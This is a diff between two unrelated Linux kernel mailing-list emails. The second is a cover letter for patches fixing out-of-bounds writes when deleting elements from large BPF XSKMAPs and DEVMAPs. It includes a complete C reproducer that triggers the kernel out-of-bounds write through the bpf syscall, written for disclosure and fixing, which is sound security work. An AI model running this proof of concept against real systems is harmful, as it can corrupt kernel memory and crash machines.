@@ -1,135 +1,140 @@
-Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.18])
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.16])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5C9BB17E00E;
-	Fri, 22 Nov 2024 11:40:31 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4169E4500E;
+	Fri, 22 Nov 2024 12:10:37 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.16
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1732275636; cv=none; b=QJXbFs6Opt/d4cV/KMbUVLc2//RrF2eyVznJN4u4V+2hli/2Esta6t1cuWxYQsWgNIQM1P35g9CaVcH9z+6x3YlIwDZZVLFaa9W1JS/rZagL7h7FQMQiZgLaQyazi+/s+tI0OL3gAu697hoU1Z/JZIlsaEBTCfSh38lQjU/P/Lg=
+	t=1732277439; cv=none; b=CImXHC+mMG5r8Et+laBYJDUJyeT3g0GVgMtt5ohDfU2hxttkYsAL/K804NgQwfIgTf1RHUCUc/zQkDhRLw/JNSHTOkmpJ/GsGmPPDx+izBN8xjNMRXlFSp/47LKyz6uxHBViPt3W2BmT2pGj1i78Q4Km7P2yAyi+aeYjnBfk2r4=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1732275636; c=relaxed/simple;
-	bh=i6CLV1FXRfEQmnP0bc/FJIlv39wNpE+G83O2FsKArr0=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=HK9ECLexx0krmJdZPxCjfajjVouWbK1QgriHcK2cK8Vi9r7DYM8So86mB4RnshTsj2fymxJ/U8lKLLHefIciAyV8Z7BRluQjHRizBlV4UgtwEL5ffjl6awO8hPMbOch8VR82rGdwuWppg1G4GL8hDWOxzMnzqulR0atIaIfh5yI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=fBhS4Exb; arc=none smtp.client-ip=192.198.163.18
+	s=arc-20240116; t=1732277439; c=relaxed/simple;
+	bh=L4zavfyLA4o68eATlkOurL6KhT/2AlkjQVk9FqfOUvA=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version:Content-Type; b=SVtsHcy7J7TJQM2tuvmN2BjC7ScEMYYefdit5ZbEkHzhRwOmiQ1+TI11hmmzAFNWXBBcM/6XAW8WdiHKLtg/UT8KJIf+rfA2cbA6eK2k7HmBA+q6KYAHWl+kTj2M2ItGx91LUn99fzd+/uUvJ/A0U0xbLe2ELrtWib1+NgtJVxs=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=KzRfDZRw; arc=none smtp.client-ip=192.198.163.16
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="fBhS4Exb"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="KzRfDZRw"
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
   d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1732275631; x=1763811631;
+  t=1732277437; x=1763813437;
   h=from:to:cc:subject:date:message-id:mime-version:
    content-transfer-encoding;
-  bh=i6CLV1FXRfEQmnP0bc/FJIlv39wNpE+G83O2FsKArr0=;
-  b=fBhS4Exb5g2Vc+2vZ7VOgeNuDThW9YvyBkhOAoxtRkEHCUypbVWzWUsJ
-   jlrIHE32ksSfP6KyFiWsnmq4WGlCw9CR8kmXL4Nv2WtH7iqgIhe105osP
-   7Xez3W7hDqE0Q5jCos2xAZPx3hoAPKv3UKZ0Vpd6poi4VV7CJA+Zx1PQ5
-   B/uEn98dORLLyrWYpSoVxFkzPDrY6hFjOmcLPIdaKzDeOaeRAU5xzLXRM
-   7zQtNDpWD3CDOGpYKQm1krBlVInCL6CjedtbuTZn12LXnmgZOlF2RrLMt
-   dB+9WUCC7dVoeCs58pViItWQK3HjgP6iLNRUezSeDLG4+NY4+dvLZE9JL
-   Q==;
-X-CSE-ConnectionGUID: XQo6tbalTW6xvIyI8skeTQ==
-X-CSE-MsgGUID: bShtfSmfTwWoUvI/Izb+UQ==
-X-IronPort-AV: E=McAfee;i="6700,10204,11263"; a="31783571"
+  bh=L4zavfyLA4o68eATlkOurL6KhT/2AlkjQVk9FqfOUvA=;
+  b=KzRfDZRw3qvD9CfG+zIsDBf6BWvXILu7lZphf6QDe+kuql8sYWM/E0Cs
+   gpJiRxQPzrwUAJRrSJDM9Ki656LInAljqKw8PJvaKfmwlFZe6ngnMsmgl
+   DukcOcWbx9CfOpNGzZpRl2EPCGvmxCW/ERBInr9x4ZicpFJczQJP855tH
+   aNDItOElEovOM3saIcLGE9gzLlHZU6Bvw5awTDpPEXLWY2jGKNj1pwPHG
+   VWWxzVVBIgPI9608ecJHPeYfkc7ejZMmxHxt48pOgV8wp6kVbZthODi+f
+   UvD+YsRQ1FqboWori8JiTL2FlWfwpJKO/Di33QQhvpwEkfwRyb/VINH0Z
+   A==;
+X-CSE-ConnectionGUID: CVorj6bITmS9TbUA+Az9Ew==
+X-CSE-MsgGUID: X/nUF3M7T7SW0F7Y+JjNNQ==
+X-IronPort-AV: E=McAfee;i="6700,10204,11263"; a="20019724"
 X-IronPort-AV: E=Sophos;i="6.12,175,1728975600"; 
-   d="scan'208";a="31783571"
-Received: from fmviesa001.fm.intel.com ([10.60.135.141])
-  by fmvoesa112.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 22 Nov 2024 03:40:30 -0800
-X-CSE-ConnectionGUID: +DIRouKGQyG4razPmurnuw==
-X-CSE-MsgGUID: RVWYirEYQtKOFB+YzOf+PQ==
+   d="scan'208";a="20019724"
+Received: from fmviesa004.fm.intel.com ([10.60.135.144])
+  by fmvoesa110.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 22 Nov 2024 04:10:37 -0800
+X-CSE-ConnectionGUID: jPI+KXzJTQWsrMcybvrI5A==
+X-CSE-MsgGUID: +Q2skeJrS06n4hPwjMtrPw==
 X-ExtLoop1: 1
 X-IronPort-AV: E=Sophos;i="6.12,175,1728975600"; 
-   d="scan'208";a="121511166"
-Received: from irvmail002.ir.intel.com ([10.43.11.120])
-  by fmviesa001.fm.intel.com with ESMTP; 22 Nov 2024 03:40:27 -0800
-Received: from lincoln.igk.intel.com (lincoln.igk.intel.com [10.102.21.235])
-	by irvmail002.ir.intel.com (Postfix) with ESMTP id DA89228778;
-	Fri, 22 Nov 2024 11:40:24 +0000 (GMT)
-From: Larysa Zaremba <larysa.zaremba@intel.com>
-To: bpf@vger.kernel.org
-Cc: Larysa Zaremba <larysa.zaremba@intel.com>,
-	=?UTF-8?q?Bj=C3=B6rn=20T=C3=B6pel?= <bjorn@kernel.org>,
-	Magnus Karlsson <magnus.karlsson@intel.com>,
-	Maciej Fijalkowski <maciej.fijalkowski@intel.com>,
-	Jonathan Lemon <jonathan.lemon@gmail.com>,
-	"David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	Alexei Starovoitov <ast@kernel.org>,
-	Daniel Borkmann <daniel@iogearbox.net>,
-	Jesper Dangaard Brouer <hawk@kernel.org>,
-	John Fastabend <john.fastabend@gmail.com>,
-	Simon Horman <horms@kernel.org>,
-	Przemek Kitszel <przemyslaw.kitszel@intel.com>,
-	Jacob Keller <jacob.e.keller@intel.com>,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org,
-	Alasdair McWilliam <alasdair.mcwilliam@outlook.com>
-Subject: [PATCH bpf] xsk: always clear DMA mapping information when unmapping the pool
-Date: Fri, 22 Nov 2024 12:29:09 +0100
-Message-ID: <20241122112912.89881-1-larysa.zaremba@intel.com>
-X-Mailer: git-send-email 2.43.0
+   d="scan'208";a="95354711"
+Received: from boxer.igk.intel.com ([10.102.20.173])
+  by fmviesa004.fm.intel.com with ESMTP; 22 Nov 2024 04:10:34 -0800
+From: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
+To: bpf@vger.kernel.org,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	andrii@kernel.org
+Cc: netdev@vger.kernel.org,
+	magnus.karlsson@intel.com,
+	bjorn@kernel.org,
+	maciej.fijalkowski@intel.com,
+	jordyzomer@google.com,
+	security@kernel.org
+Subject: [PATCH v2 bpf 0/2] bpf: fix OOB accesses in map_delete_elem callbacks
+Date: Fri, 22 Nov 2024 13:10:28 +0100
+Message-Id: <20241122121030.716788-1-maciej.fijalkowski@intel.com>
+X-Mailer: git-send-email 2.38.1
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
-When the umem is shared, the DMA mapping is also shared between the xsk
-pools, therefore it should stay valid as long as at least 1 user remains.
-However, the pool also keeps the copies of DMA-related information that are
-initialized in the same way in xp_init_dma_info(), but cleared by
-xp_dma_unmap() only for the last remaining pool, this causes the problems
-below.
+v1->v2:
+- CC stable and collect tags from Toke & John
 
-The first one is that the commit adbf5a42341f ("ice: remove af_xdp_zc_qps
-bitmap") relies on pool->dev to determine the presence of a ZC pool on a
-given queue, avoiding internal bookkeeping. This works perfectly fine if
-the UMEM is not shared, but reliably fails otherwise as stated in the
-linked report.
+Hi,
 
-The second one is pool->dma_pages which is dynamically allocated and
-only freed in xp_dma_unmap(), this leads to a small memory leak. kmemleak
-does not catch it, but by printing the allocation results after terminating
-the userspace program it is possible to see that all addresses except the
-one belonging to the last detached pool are still accessible through the
-kmemleak dump functionality.
+Jordy reported that for big enough XSKMAPs and DEVMAPs, when deleting
+elements, OOB writes occur.
 
-Always clear the DMA mapping information from the pool and free
-pool->dma_pages when unmapping the pool, so that the only difference
-between results of the last remaining user's call and the ones before would
-be the destruction of the DMA mapping.
+Reproducer below:
 
-Fixes: adbf5a42341f ("ice: remove af_xdp_zc_qps bitmap")
-Fixes: 921b68692abb ("xsk: Enable sharing of dma mappings")
-Reported-by: Alasdair McWilliam <alasdair.mcwilliam@outlook.com>
-Closes: https://lore.kernel.org/PA4P194MB10056F208AF221D043F57A3D86512@PA4P194MB1005.EURP194.PROD.OUTLOOK.COM
-Acked-by: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
-Signed-off-by: Larysa Zaremba <larysa.zaremba@intel.com>
----
- net/xdp/xsk_buff_pool.c | 5 ++---
- 1 file changed, 2 insertions(+), 3 deletions(-)
+// compile with gcc -o map_poc map_poc.c -lbpf
+#include <errno.h>
+#include <linux/bpf.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <unistd.h>
 
-diff --git a/net/xdp/xsk_buff_pool.c b/net/xdp/xsk_buff_pool.c
-index 521a2938e50a..0662d34b09ee 100644
---- a/net/xdp/xsk_buff_pool.c
-+++ b/net/xdp/xsk_buff_pool.c
-@@ -387,10 +387,9 @@ void xp_dma_unmap(struct xsk_buff_pool *pool, unsigned long attrs)
- 		return;
- 	}
- 
--	if (!refcount_dec_and_test(&dma_map->users))
--		return;
-+	if (refcount_dec_and_test(&dma_map->users))
-+		__xp_dma_unmap(dma_map, attrs);
- 
--	__xp_dma_unmap(dma_map, attrs);
- 	kvfree(pool->dma_pages);
- 	pool->dma_pages = NULL;
- 	pool->dma_pages_cnt = 0;
+
+int main() {
+  // Create a large enough BPF XSK map
+  int map_fd;
+  union bpf_attr create_attr = {
+      .map_type = BPF_MAP_TYPE_XSKMAP,
+      .key_size = sizeof(int),
+      .value_size = sizeof(int),
+      .max_entries = 0x80000000 + 2,
+  };
+
+  map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &create_attr, sizeof(create_attr));
+  if (map_fd < 0) {
+    fprintf(stderr, "Failed to create BPF map: %s\n", strerror(errno));
+    return 1;
+  }
+
+
+  // Delete an element from the map using syscall
+  unsigned int key = 0x80000000 + 1;
+  if (syscall(SYS_bpf, BPF_MAP_DELETE_ELEM,
+              &(union bpf_attr){
+                  .map_fd = map_fd,
+                  .key = &key,
+              },
+              sizeof(union bpf_attr)) < 0) {
+    fprintf(stderr, "Failed to delete element from BPF map: %s\n",
+            strerror(errno));
+    return 1;
+  }
+
+  close(map_fd);
+  return 0;
+}
+
+This tiny series changes data types from int to u32 of keys being used
+for map accesses.
+
+Thanks,
+Maciej
+
+
+Maciej Fijalkowski (2):
+  xsk: fix OOB map writes when deleting elements
+  bpf: fix OOB devmap writes when deleting elements
+
+ kernel/bpf/devmap.c | 6 +++---
+ net/xdp/xskmap.c    | 2 +-
+ 2 files changed, 4 insertions(+), 4 deletions(-)
+
 -- 
-2.43.0
+2.34.1
 
